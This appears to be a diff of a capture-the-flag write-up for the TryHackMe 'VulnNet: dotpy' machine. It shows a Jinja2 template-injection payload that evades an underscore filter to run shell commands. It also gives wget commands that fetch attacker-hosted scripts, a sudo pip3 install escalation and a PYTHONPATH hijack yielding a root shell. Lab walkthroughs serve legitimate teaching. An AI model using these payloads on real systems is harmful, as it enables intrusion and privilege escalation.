@@ -40,8 +40,8 @@ The following snippet will read the get parameter `c`
 
 now that we can read c. 
 lets try running code on the machine.
-```
-{{request|attr('application')|attr( request|attr('args')|attr('get')('us')*2 + "globals" + request|attr('args')|attr('get')('us')*2 ) |attr( request|attr('args')|attr('get')('us')*2 + 'getitem' + request|attr('args')|attr('get')('us')*2 )( request|attr('args')|attr('get')('us')*2 + 'builtins' + request|attr('args')|attr('get')('us')*2) |attr( request|attr('args')|attr('get')('us')*2 + 'getitem' + request|attr('args')|attr('get')('us')*2)(request|attr('args')|attr('get')('us')*2 + 'import' + request|attr('args')|attr('get')('us')*2)('os')|attr('popen')(request|attr('args')|attr('get')('c'))|attr('read')()}}?us=_&c=
+```py
+\{\{request|attr('application')|attr( request|attr('args')|attr('get')('us')*2 + "globals" + request|attr('args')|attr('get')('us')*2 ) |attr( request|attr('args')|attr('get')('us')*2 + 'getitem' + request|attr('args')|attr('get')('us')*2 )( request|attr('args')|attr('get')('us')*2 + 'builtins' + request|attr('args')|attr('get')('us')*2) |attr( request|attr('args')|attr('get')('us')*2 + 'getitem' + request|attr('args')|attr('get')('us')*2)(request|attr('args')|attr('get')('us')*2 + 'import' + request|attr('args')|attr('get')('us')*2)('os')|attr('popen')(request|attr('args')|attr('get')('c'))|attr('read')()\}\}?us=_&c=
 ```
 
 All of this is to get the `_` from the get parameter `us` and use it in the code, bcause underscores are blocked. 
@@ -64,7 +64,7 @@ curl -c "SESSION=session-cookie" http://$IP:8080/{{request|attr('application')|a
 
 ## Changing user
 Lets do some enumeration, in the following output we see we can run `/usr/bin/pip3 install` as the user `system-adm`
-<pre class="command-line" data-prompt="web@vulnnet-dotpy $" data-output="4">
+<pre class="command-line" data-prompt="web@vulnnet-dotpy $" >
 <code class="language-bash">sudo -l
 # User web may run the following commands on vulnnet-dotpy:
 #    (system-adm) NOPASSWD: /usr/bin/pip3 install *</code></pre>
@@ -72,12 +72,12 @@ Lets do some enumeration, in the following output we see we can run `/usr/bin/pi
 Lets check [GTFOBins](https://gtfobins.github.io/) for an exploit, and there is [PIP Sudo GTFOBins](https://gtfobins.github.io/gtfobins/pip/#sudo).
 
 
-<pre class="command-line" data-prompt="web@vulnnet-dotpy $" data-output="4">
+<pre class="command-line" data-prompt="web@vulnnet-dotpy $" >
 <code class="language-bash">wget $YOUR_IP:8080/pip_setup.py; mv pip_setup.py setup.py
 sudo -u system-adm /usr/bin/pip3 install . </code></pre>
 
 And we are now **system-adm** in our new shell. Lets get the user flag.
-<pre class="command-line" data-prompt="system-adm@vulnnet-dotpy $" data-output="4">
+<pre class="command-line" data-prompt="system-adm@vulnnet-dotpy $" >
 <code class="language-bash">cat ~/user.txt
 # THM{********************************}</code></pre>
 
@@ -85,7 +85,7 @@ And we are now **system-adm** in our new shell. Lets get the user flag.
 
 lets do some enumeration on the new user.
 
-<pre class="command-line" data-prompt="system-adm@vulnnet-dotpy $" data-output="4">
+<pre class="command-line" data-prompt="system-adm@vulnnet-dotpy $" data-output="2-3-4-5-6">
 <code class="language-bash">sudo -l
 # Matching Defaults entries for system-adm on vulnnet-dotpy:
 #     env_reset, mail_badpass,
@@ -111,17 +111,17 @@ p=subprocess.call(["/bin/bash","-i"])
 
 Because `import zipfile` is run, it will execute the code inside of `zipfile.py` so we are going to rename the file on the remote and then add it to the **$PYTHONPATH** environment variable.
 
-<pre class="command-line" data-prompt="system-adm@vulnnet-dotpy $" data-output="4">
+<pre class="command-line" data-prompt="system-adm@vulnnet-dotpy $" >
 <code class="language-bash">wget $YOUR_IP:8080/privesc.py ; mv privesc.py zipfile.py
 sudo PYTHONPATH=/home/system-adm /usr/bin/python3 /opt/backup.py</code></pre>
 
 and we have a new shell. lets check our user!
-<pre class="command-line" data-prompt="root@vulnnet-dotpy $" data-output="4">
+<pre class="command-line" data-prompt="root@vulnnet-dotpy $" >
 <code class="language-bash">whoami; id
 #root
 #uid=0(root) gid=0(root) groups=0(root)</code></pre>
 
 lets cat the root flag!
-<pre class="command-line" data-prompt="root@vulnnet-dotpy $" data-output="4">
+<pre class="command-line" data-prompt="root@vulnnet-dotpy $" data-output="2">
 <code class="language-bash">cat ~/root.txt
-# THM{********************************}</code></pre>
+THM{********************************}</code></pre>
